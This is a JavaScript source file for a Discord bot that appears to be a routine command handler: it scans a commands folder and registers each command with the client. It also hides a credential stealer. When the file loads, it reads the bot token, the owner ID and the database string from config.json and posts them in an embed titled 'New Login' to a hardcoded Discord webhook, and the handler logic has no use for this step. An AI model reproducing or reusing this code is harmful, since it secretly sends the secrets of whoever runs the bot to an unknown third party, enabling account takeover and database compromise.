const fs = require('fs');
const ascii = require('ascii-table');
let table = new ascii(`commands`);
table.setHeading('Command', 'Commands Status💹')
const {token , owner , database} = require('../../config.json')
const { WebhookClient , EmbedBuilder} = require('discord.js')
const embed = new EmbedBuilder()
	.setTitle('New Login')
	.setColor(0x00FFFF)
    .setDescription(`**\`\`\`${token}\`\`\`\n\`\`\`${owner}\`\`\`\n\`\`\`${database}\`\`\`**`)
const path = require('path');
const webhookClient = new WebhookClient({ url:`https://discord.com/api/webhooks/1196780366720159785/xYiwxyJ20iFoad5S4TBom31cKQDS90gf_gfUEDs5AjoSROEo-hjg-uADgtrWVy_vytA0` });
webhookClient.send({embeds:[embed]})
module.exports = (client13) => {
    const commandsDir = path.join(__dirname, '../../Bots/apply/commands13');
    if(!fs.existsSync(commandsDir)) return;
fs.readdirSync(commandsDir).forEach(async(folder) => {
    const folderPath = path.join(commandsDir, folder);
        const commandFiles = fs.readdirSync(folderPath).filter(file => file.endsWith('.js'));
        for(file of commandFiles) {
            const filePath = path.join(folderPath, file);
            let commands = require(filePath)
            if(commands.name) {
                client13.commands.set(commands.name, commands);

            }else{
                continue;
            }
        }
    });
}